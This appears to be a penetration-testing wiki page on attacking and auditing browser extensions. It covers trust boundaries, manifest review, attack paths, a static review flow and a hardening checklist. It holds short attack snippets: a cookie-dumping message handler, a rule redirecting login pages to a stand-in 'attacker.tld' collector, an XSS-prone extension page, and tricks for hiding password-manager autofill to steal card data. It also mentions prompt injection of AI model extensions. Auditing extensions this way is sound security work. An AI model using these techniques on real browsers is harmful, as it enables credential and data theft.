---
title: "Browser Extension Attacks"
type: technique
tags: [web, browser-extension, chrome, content-script, message-passing]
phase: exploitation
sources: [hacktricks-web]
---

# Browser Extension Attacks

## What it is

Browser extensions run privileged JavaScript that the browser loads across many sites. An extension can read cookies, DOM, browsing history, the clipboard, and (with broad `host_permissions`) fetch any origin free of CORS, and it can bridge to a local binary via native messaging. Three attacker positions matter: a fully malicious extension the victim installs, a benign-but-compromised one (stolen developer account pushing a trojanized update), and a benign extension that contains an exploitable bug reachable from a web page. The last case is the interesting pentest target: a normal website (or an XSS on a trusted origin) drives untrusted input inward until it reaches the extension's privileged core, yielding cookie/credential theft, universal XSS, or RCE via a native host.

## Trust boundaries (attack-surface map)

Extensions are layered rings, from untrusted outer to privileged inner. The exploit goal is always to push attacker input one ring inward.

- **Web page** (untrusted): the site the user visits. Communicates with the extension only through the shared DOM and `window.postMessage`.
- **Content script**: injected into pages matching `content_scripts.matches`. Shares the page DOM but runs in an isolated JS heap; it holds almost no privileged APIs (mostly `storage` plus messaging). It receives untrusted input from the page and relays it inward with `runtime.sendMessage` / `runtime.connect`.
- **Background / service worker** (MV3 `service_worker`, MV2 `background`): holds the extension privileges and API access, but has no direct access to page DOM. This is the crown jewel.
- **Extension pages**: options page, popup, and any HTML in `web_accessible_resources`, served from the `chrome-extension://<id>/` origin. They can message the background.
- **Native messaging host**: a local binary the background talks to over stdio via `runtime.sendNativeMessage` / `connectNative`. A dangerous message handler here is RCE with the user's full privileges.

Message flow to abuse: `page -postMessage/DOM-> content script -runtime.sendMessage-> background -sendNativeMessage-> native binary`.

## manifest.json: what to read first

The manifest is the whole threat model on one page. Pull the extension source (see static review below) and read these fields before anything else:

- `permissions`: privileged APIs (`cookies`, `tabs`, `history`, `bookmarks`, `clipboard`, `geolocation`, `scripting`, `webRequest`, `declarativeNetRequest`, `nativeMessaging`).
- `host_permissions`: which origins those APIs may touch. `*://*/*`, `<all_urls>`, or `http://*/*` = everything.
- `content_scripts` (`matches` / `exclude_matches`, `run_at`): where and when injected code runs. Broad `matches` widens the input surface.
- `background.service_worker` / `background.scripts`: the privileged logic.
- `web_accessible_resources`: extension files a web page may load or frame (clickjacking + reflected-XSS surface).
- `externally_connectable`: which web origins/extensions may message the background directly.
- `content_security_policy`: `unsafe-eval` or a whitelisted CDN weakens extension-page XSS defence.
- `chrome_settings_overrides`: search-provider / new-tab override (search hijacking with no other permission).

## Attack paths

### 1. Over-scoped permissions and host_permissions (data theft)

Broad grants turn a benign feature into surveillance. `host_permissions: ["<all_urls>"]` lets the background `fetch("https://mail.example/")` any site without CORS. The `cookies` permission returns every browser cookie including `HttpOnly`, so `cookies` + broad host access is credential-stealing capable. `history` and `bookmarks` dump the full lists at once; `geolocation`, `clipboard`, `webcam`/`microphone` are granted implicitly at install (webcam prompts once, then reads silently thereafter). A classic backdoor is a background handler that returns everything:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getCookies") {
    chrome.cookies.getAll({}, (cookies) => sendResponse({ data: cookies }))
    return true
  }
})
```

With `declarativeNetRequest` + `<all_urls>` an attacker reprograms network policy at runtime to redirect or exfiltrate login POSTs. `declarativeNetRequestWithHostAccess` (Chrome 96+) gives the same block/redirect power with a weaker install prompt than `<all_urls>`, so malware prefers it. Runtime rules also hide routing: benign static rules ship in the package, then `chrome.declarativeNetRequest.updateDynamicRules()` installs the real redirect in the service worker (dump live rules with `getDynamicRules()` from the extension context).

```javascript
chrome.declarativeNetRequest.updateDynamicRules({
  addRules: [{
    id: 9001, priority: 1,
    action: { type: "redirect", redirect: { url: "https://attacker.tld/collect" } },
    condition: { urlFilter: "|http*://*/login", resourceTypes: ["main_frame"] }
  }]
})
```

`chrome_settings_overrides.search_provider` with `{searchTerms}` and `is_default: true` hijacks every omnibox search through operator infrastructure with no content scripts and no extra permission. Audit whether the extension's branding matches the search endpoint domain; a "utility" extension routing searches to an affiliate network (`hspart`/`hsimp` params) is the tell.

### 2. externally_connectable: message the background directly

`externally_connectable.matches` lists web origins allowed to call `chrome.runtime.sendMessage(extensionId, ...)`, landing straight in `onMessageExternal` and bypassing the content script and its page CSP entirely. If a listed origin is broad (`https://*.example.com/*`) or wildcard, any XSS, [[subdomain-takeover]], or compromised vendor widget on a matching subdomain becomes equivalent to owning the extension's web-facing API:

```javascript
chrome.runtime.sendMessage("<extension-id>", { type: "privileged_action", payload: { attacker: "controlled" } })
```

This is worst in agentic/assistant extensions where the "message" is an instruction prompt executed with the extension's host permissions. Audit: the handler must do **exact origin equality** (`sender.origin === "https://app.example.com"`), not suffix/regex/wildcard, and must authorize message-type and origin together (a safe origin for telemetry is not safe for privileged actions). Treat first-party subdomains hosting third-party JS or user content as outside the trust boundary. Rollback hunting: if a trusted origin serves versioned assets (`/assets/widget/1.26.0/index.html`), walk older builds for a still-reachable vulnerable version that re-establishes JS execution on the trusted origin.

### 3. Message-passing abuse (postMessage and runtime messages)

The page talks to the content script over `window.postMessage`; the content script relays inward. A content-script listener that forwards page messages to the background without validation lets the page trigger privileged actions. A secure listener checks all of `event.source === window`, the origin (allowlist, and be careful with regex), and `event.isTrusted`. Weak or missing checks are the bug. See [[dom-attacks]] for the postMessage validation pitfalls.

```javascript
window.addEventListener("message", (event) => {
  if (event.source !== window) return
  if (event.data.type === "FROM_PAGE") port.postMessage(event.data.text) // forwarded to background
}, false)
```

Equally, `runtime.onMessage` handlers that act on `request.action` without checking `sender` let any reachable page (or a rogue co-installed extension via an allowed origin) invoke sensitive branches.

### 4. DOM-based sinks in content scripts and extension pages

A content script that reads the page DOM and trusts it is compromised whenever the page is attacker-controlled or itself XSS-able: data flowing from the DOM into `innerHTML`, `eval`, `document.write`, or `insertAdjacentHTML` runs in the extension context. The `web_accessible_resources` HTML pages are a reflected-XSS surface: a page like `message.html?content=...` that writes the query parameter into the body executes script in the `chrome-extension://` origin. With a relaxed CSP (`script-src 'self' 'unsafe-eval'`) and jQuery `.html()`/`.append()` (which route markup through `globalEval()` to `eval()`), this is a reliable universal XSS. See [[xss]].

```javascript
// vulnerable web_accessible_resources page
let userContent = new URLSearchParams(location.search).get("content")
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`) // XSS in extension origin
```

Even a page not listed in `web_accessible_resources` is reachable in a new tab by anyone who knows the extension ID (public in the store, unless `use_dynamic_url`), so an XSS abusing the same parameters still applies.

### 5. Native messaging: any-page-to-RCE

If the background forwards attacker-influenced data to a native host that handles it unsafely, a web page reaches code execution. The vulnerable chain: wildcard `content_scripts.matches`, content script forwards `postMessage` to background via `sendMessage`, background passes it to `sendNativeMessage`, and the native binary shells out on the message. The native host manifest binds a `name`, the binary `path`, and `allowed_origins` (extension IDs, no wildcard). Sanitize on both ends.

### 6. Clickjacking of extension UI

Any HTML in `web_accessible_resources` can be framed by an attacker page, overlaid at low opacity, and clicked through. Real cases: framing PrivacyBadger's `skin/popup.html` to make the victim click "Disable for this Website", and framing Metamask's `phishing.html` to click-whitelist a phishing page. Confirm the page is actually framable first (a CSP `frame-ancestors 'none'` or `X-Frame-Options: DENY` blocks it). See [[clickjacking]]. XSS in a `web_accessible_resources` page can be chained with clickjacking to force the interaction that triggers it (Steam Inventory Helper: DOM XSS in `bookmarks.html` + framable page).

**DOM-based extension clickjacking** targets password-manager autofill dropdowns injected into the page DOM. The attacker hides or occludes the dropdown while keeping it clickable, then coerces a single click to select a stored item and fill an attacker form:

- Zero the extension root opacity (`document.querySelector('protonpass-root').style.opacity = 0`), or reach into an open ShadowRoot and hide the internal iframe.
- Or set `document.body.style.opacity = 0.001` (page looks blank/screenshot-backed but clicks still register) and read filled values off an injected credit-card form.
- Or a full overlay with `pointer-events: none` (kept persistent via the Popover API) so clicks pass through to the hidden dropdown; a follow-mouse form that refocuses periodically makes any single click land.

Impact: on an attacker site, one click exfiltrates non-domain-scoped data (card number/expiry/CVC, name/email/phone). On a trusted site with XSS/takeover, multi-click theft of credentials and TOTP because managers autofill across related subdomains; passkey prompts can be hidden to elicit the confirming click when WebAuthn challenges are not session-bound.

## Static review flow

1. **Get the source.** Download the CRX and unpack it:

```bash
extension_id=REPLACE_ME
curl -L -o "$extension_id.zip" "https://clients2.google.com/service/update2/crx?response=redirect&os=mac&arch=x86-64&nacl_arch=x86-64&prod=chromecrx&prodchannel=stable&prodversion=44.0.2403.130&x=id%3D$extension_id%26uc"
unzip -d "$extension_id-source" "$extension_id.zip"
```

Alternatives: the CRX Viewer web tool (`robwu.nl/crxviewer`), the Chrome Extension Source Viewer extension, renaming `.crx` to `.zip`, or reading the profile `Extensions/` directory (find the profile path at `chrome://version/`). Load unpacked at `chrome://extensions/` (Developer Mode) to debug; inspect the service worker from the extension's details, and view content scripts under DevTools Sources > Content Scripts.

2. **Map the manifest** (permissions, host_permissions, externally_connectable, web_accessible_resources, CSP) as above.

3. **Grep the sinks and entry points.** Sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `setTimeout(string)`, `.html()`/`.append()`, `location`, `executeScript`, `sendNativeMessage`. Entry points: `onMessage`/`onMessageExternal`/`onConnectExternal` listeners, `window.addEventListener("message")`, and `chrome.storage` reads that feed a sink.

4. **Diff updates for supply-chain trojans.** Compare a new package against the last known-good version; flag new/changed background and content scripts (per-file hashes catch changes when the manifest is unchanged), newly added permissions/host_permissions, new domains extracted from code, and entropy jumps in changed scripts. High-confidence combo: new domains + new detections (base64/cookie-harvest/network-builder) + updated worker + updated content scripts.

## Detection and defence (hardening checklist)

- Request the minimum `permissions` and `host_permissions`; prefer `activeTab` over broad host grants.
- Strong `content_security_policy`, no `unsafe-eval`, no wildcard CDN.
- `externally_connectable` set to `{}` when unused, or an exact minimal origin list; never wildcard/suffix trust for privileged handlers.
- Minimal `web_accessible_resources`; serve extension HTML with `frame-ancestors 'none'`; render autofill UIs in the Top Layer (Popover API), prefer closed Shadow DOM, and detect hostile overlays with `elementsFromPoint()` before filling.
- Validate every inbound message: `event.source`/origin/`isTrusted` for postMessage, exact `sender.origin` for external messages, and message-type + origin authorization together.
- Never trust the page DOM read by a content script; sanitize before any HTML sink.
- No secrets in code, extension memory (dumpable via the DevTools heap snapshot), or the clipboard.

## Tools

- **Tarnish** (`thehackerblog.com/tarnish`): pulls an extension from a store link, prettifies the manifest, and flags dangerous functions, entry points, web_accessible_resources, CSP weaknesses, and known-vulnerable libraries (Retire.js).
- **Neto**: Python analyzer that unpacks and unravels manifest/JS/HTML features of Chrome and Firefox extensions.
- **crxaminer** (`crxaminer.tech`): risk-scores an extension from its requested permissions.
- **chrome-extension-manifests-dataset**: query manifests at scale for risky combinations (e.g. `content_scripts` + `nativeMessaging` on high-user extensions).
- **Retire.js**: known-vulnerable JS library detection.

## Sources

- HackTricks - Browser Extension Pentesting Methodology (README, permissions & host_permissions, clickjacking, XSS example)
